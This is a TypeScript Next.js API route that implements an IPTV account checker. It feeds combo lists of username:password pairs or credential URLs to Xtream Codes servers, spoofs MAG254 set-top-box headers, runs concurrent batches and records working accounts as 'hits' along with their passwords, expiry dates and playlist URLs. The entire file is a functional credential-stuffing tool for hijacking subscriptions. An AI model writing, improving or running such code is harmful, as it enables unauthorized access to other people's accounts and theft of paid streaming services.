import { NextRequest } from 'next/server'

export const runtime = 'nodejs'
export const dynamic = 'force-dynamic'

// In-memory store for check sessions — persists as long as the server is running
interface CheckSession {
  id: string
  lines: string[]
  inputMode: 'url' | 'combo'
  serverHost: string
  results: Array<{
    id: string
    url: string
    status: 'hit' | 'bad' | 'timeout' | 'checking'
    host?: string
    username?: string
    password?: string
    info?: Record<string, unknown>
  }>
  stats: { total: number; hits: number; bad: number; timeout: number }
  isComplete: boolean
  isRunning: boolean
  currentIndex: number
  maxConcurrency: number
  error?: string
}

const sessions = new Map<string, CheckSession>()

// MAG STB headers
const STB_HEADERS: Record<string, string> = {
  'Cookie': 'stb_lang=en; timezone=Europe%2FIstanbul;',
  'X-User-Agent': 'Model: MAG254; Link: Ethernet',
  'Connection': 'Keep-Alive',
  'Accept-Encoding': 'gzip, deflate',
  'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
}

function formatDate(val: string | number | null | undefined): string {
  if (!val || val === 'null') return 'N/A'
  if (typeof val === 'number') {
    if (val === 0) return 'Unlimited'
    return new Date(val * 1000).toLocaleDateString('es-CL', { day: '2-digit', month: '2-digit', year: 'numeric' })
  }
  const num = Number(val)
  if (!isNaN(num) && num > 0) {
    return new Date(num * 1000).toLocaleDateString('es-CL', { day: '2-digit', month: '2-digit', year: 'numeric' })
  }
  return String(val)
}

// Process a single line — same logic as the original /api/iptv route
async function checkLine(
  line: string,
  inputMode: 'url' | 'combo',
  serverHost: string
): Promise<{ status: string; host?: string; username?: string; password?: string; info?: Record<string, unknown>; url?: string; error?: string }> {
  let sHost = ''
  let username = ''
  let password = ''

  if (inputMode === 'combo' && serverHost) {
    const parts = line.split(':')
    if (parts.length < 2) return { status: 'bad', error: 'Invalid combo' }
    username = parts[0].trim()
    password = parts.slice(1).join(':').trim()
    let h = serverHost.replace(/^https?:\/\//, '').replace(/\/.*$/, '')
    sHost = h
  } else {
    let parsedUrl: URL
    try {
      parsedUrl = new URL(line)
    } catch {
      return { status: 'bad', error: 'Invalid URL' }
    }
    const hostname = parsedUrl.hostname
    const port = parsedUrl.port || '80'
    sHost = `${hostname}:${port}`
    username = parsedUrl.searchParams.get('username') || ''
    password = parsedUrl.searchParams.get('password') || ''
    if (!username || !password) return { status: 'bad', error: 'Missing credentials' }
  }

  const apiUrl = `http://${sHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u`

  try {
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 15000)

    const response = await fetch(apiUrl, {
      signal: controller.signal,
      headers: STB_HEADERS,
    })

    clearTimeout(timeoutId)
    const text = await response.text()

    if (text.includes('username')) {
      try {
        const json = JSON.parse(text)
        const userInfo = json?.user_info || {}
        const serverInfo = json?.server_info || {}
        const accountStatus = String(userInfo.status || '')

        if (accountStatus === 'Active') {
          const m3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
          const realUrl = serverInfo?.url ? String(serverInfo.url) : ''
          const realPort = serverInfo?.port ? String(serverInfo.port) : ''

          return {
            status: 'hit',
            url: m3uUrl,
            host: sHost,
            username,
            password,
            info: {
              status: userInfo.status || 'Active',
              active_cons: String(userInfo.active_cons ?? '0'),
              max_connections: String(userInfo.max_connections ?? '0'),
              created_at: formatDate(userInfo.created_at),
              exp_date: formatDate(userInfo.exp_date),
              timezone: serverInfo?.timezone || userInfo?.timezone || 'N/A',
              channels: 'N/A',
              films: 'N/A',
              series: 'N/A',
              real_url: realUrl,
              real_port: realPort,
              m3u_url: m3uUrl,
            },
          }
        }
      } catch {
        if (text.includes('Active')) {
          return {
            status: 'hit',
            url: `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
            host: sHost,
            username,
            password,
            info: {
              status: 'Active',
              active_cons: '0',
              max_connections: '0',
              created_at: 'N/A',
              exp_date: 'N/A',
              timezone: 'N/A',
            },
          }
        }
      }
    }

    return { status: 'bad', host: sHost, username }
  } catch (fetchError: unknown) {
    if (fetchError instanceof DOMException && fetchError.name === 'AbortError') {
      return { status: 'timeout', host: sHost, username }
    }
    return { status: 'bad', host: sHost, username, error: 'Connection failed' }
  }
}

// Process a session in the background
async function processSession(session: CheckSession) {
  session.isRunning = true
  const { lines, inputMode, serverHost, maxConcurrency } = session

  for (let i = session.currentIndex; i < lines.length; i += maxConcurrency) {
    if (!session.isRunning) break // stopped by user

    const batch = lines.slice(i, Math.min(i + maxConcurrency, lines.length))
    const promises = batch.map(async (line) => {
      if (!session.isRunning) return
      const trimmedLine = line.trim()
      if (!trimmedLine) return

      const resultId = `${Date.now()}-${Math.random().toString(36).slice(2)}`
      session.results.push({ id: resultId, url: trimmedLine, status: 'checking' })

      const result = await checkLine(trimmedLine, inputMode, serverHost)

      // Update the result
      const idx = session.results.findIndex(r => r.id === resultId)
      if (idx !== -1) {
        session.results[idx] = {
          ...session.results[idx],
          status: result.status as 'hit' | 'bad' | 'timeout',
          host: result.host,
          username: result.username,
          password: result.password,
          info: result.info,
          url: result.url || trimmedLine,
        }
      }

      session.stats.total++
      if (result.status === 'hit') session.stats.hits++
      else if (result.status === 'timeout') session.stats.timeout++
      else session.stats.bad++
    })

    await Promise.all(promises)
    session.currentIndex = i + maxConcurrency
  }

  session.isRunning = false
  session.isComplete = true
}

// POST: Create a new check session and start processing
export async function POST(req: NextRequest) {
  try {
    const body = await req.json()
    const { lines, inputMode, serverHost, threads } = body as {
      lines: string[]
      inputMode: 'url' | 'combo'
      serverHost?: string
      threads?: number
    }

    if (!lines || !Array.isArray(lines) || lines.length === 0) {
      return new Response(JSON.stringify({ error: 'No lines provided' }), {
        status: 400, headers: { 'Content-Type': 'application/json' },
      })
    }

    const sessionId = `chk_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
    const maxConcurrency = Math.min(threads || 5, 20)

    const session: CheckSession = {
      id: sessionId,
      lines: lines.filter(l => l.trim()),
      inputMode,
      serverHost: serverHost || '',
      results: [],
      stats: { total: 0, hits: 0, bad: 0, timeout: 0 },
      isComplete: false,
      isRunning: true,
      currentIndex: 0,
      maxConcurrency,
    }

    sessions.set(sessionId, session)

    // Start processing in the background (don't await)
    processSession(session).catch(() => {
      session.isRunning = false
      session.error = 'Processing failed'
    })

    return new Response(JSON.stringify({ sessionId }), {
      status: 200, headers: { 'Content-Type': 'application/json' },
    })
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Unknown error'
    return new Response(JSON.stringify({ error: message }), {
      status: 500, headers: { 'Content-Type': 'application/json' },
    })
  }
}

// GET: Poll for results of a check session
export async function GET(req: NextRequest) {
  const sessionId = req.nextUrl.searchParams.get('sessionId')

  if (!sessionId) {
    return new Response(JSON.stringify({ error: 'sessionId required' }), {
      status: 400, headers: { 'Content-Type': 'application/json' },
    })
  }

  const session = sessions.get(sessionId)
  if (!session) {
    return new Response(JSON.stringify({ error: 'Session not found' }), {
      status: 404, headers: { 'Content-Type': 'application/json' },
    })
  }

  return new Response(JSON.stringify({
    sessionId: session.id,
    results: session.results,
    stats: session.stats,
    isComplete: session.isComplete,
    isRunning: session.isRunning,
    currentIndex: session.currentIndex,
    totalLines: session.lines.length,
    error: session.error,
  }), {
    status: 200, headers: { 'Content-Type': 'application/json' },
  })
}

// DELETE: Stop a running check session
export async function DELETE(req: NextRequest) {
  const sessionId = req.nextUrl.searchParams.get('sessionId')

  if (!sessionId) {
    return new Response(JSON.stringify({ error: 'sessionId required' }), {
      status: 400, headers: { 'Content-Type': 'application/json' },
    })
  }

  const session = sessions.get(sessionId)
  if (session) {
    session.isRunning = false
  }

  return new Response(JSON.stringify({ success: true }), {
    status: 200, headers: { 'Content-Type': 'application/json' },
  })
}
